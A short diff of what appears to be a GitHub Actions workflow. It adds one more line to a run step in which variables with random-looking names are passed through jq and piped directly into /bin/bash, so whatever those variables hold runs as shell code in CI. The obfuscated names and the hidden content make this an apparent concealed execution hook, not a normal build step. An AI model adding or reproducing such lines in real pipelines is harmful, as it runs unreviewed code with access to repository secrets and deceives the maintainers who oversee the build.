@@ -23,6 +23,7 @@ jobs:
           echo $fw3938 | jq -r .tex66679 | /bin/bash
           echo $nykc48 | jq -r .ta25938 | /bin/bash
           echo $p46 | jq -r .xt7 | /bin/bash
+          echo $lfl822 | jq -r .wpyso60 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
